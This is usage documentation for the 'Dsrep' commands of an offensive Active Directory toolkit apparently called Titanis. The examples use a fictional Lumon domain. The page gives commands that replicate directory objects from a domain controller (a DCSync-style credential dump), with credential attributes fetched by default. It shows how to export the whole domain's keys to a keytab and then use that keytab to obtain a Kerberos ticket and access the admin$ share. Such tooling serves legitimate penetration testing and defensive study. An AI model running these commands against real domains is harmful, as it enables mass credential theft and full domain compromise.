These commands interface with a domain controller using the directory replication API.

All of the `Dsrep rep` and `Dsrep repnc` commands allow you to specify additional LDAP attributes to retrieve.  By default, Titanis requests credential-related attributes.

# Get DC Info
Get DC information, along with topology.
```
Dsrep dcinfo lumon-dc1
```

# Replicate Object
`Dsrep rep` replicates updates for individual objects.  A single `Dsrep rep` command line can request multiple objects.  Each object on the command line may be specified as an account name, SID, DN, or an LDAP query.  Each object results in a separate API call, but they are all executed within the same binding.

## By Account Name
```
Dsrep rep lumon-dc1 milchick
```

## By DN
```
Dsrep rep lumon-dc1 'CN=Seth Milchick,OU=Severed Floor,OU=Kier\, PE,DC=corp,DC=lumon,DC=ind'
```

## By SID
```
Dsrep rep lumon-dc1 S-1-5-32-544
```

## By LDAP Query
This replicates all transitive members of Administrators
```
Dsrep rep lumon-dc1 '(memberOf*=<SID=S-1-5-32-544>)'
```


# Replicate Naming Context
`Dsrep repnc` replicates an entire naming context.  On Windows, this includes domains, DNS zones, and application partitions.

## Default Domain
If the command line does not specify a naming context, the default is assumed.
```
Dsrep repnc lumon-dc1
```

## DNS Naming Context
```
Dsrep repnc lumon-dc1 "DC=DomainDnsZones,DC=corp,DC=lumon,DC=ind" -outputfields entryname, dnsRecord
```

# Export Keys to Keytab
`Dsrep rep` and `Dsrep repnc` both accept `-ExportKeytab` to write the keys to a .keytab file.

## For the entire domain
```
Dsrep repnc lumon-dc1 -ExportKeytab lumon.keytab
```

The keytab is suitable to use for authentication with Titanis, as well as to decrypt a packet capture with Wireshark.
```
# Get a TGT
Kerb asreq -UserName milchick@LUMON -Kdc lumon-dc1 -Keytab lumon.keytab -OutputFileName tmp.ccache

# Authenticate directly
Smb2Client ls //lumon-dc1/admin$ -UserName milchick@LUMON -Kdc lumon-dc1 -Keytab lumon.keytab
```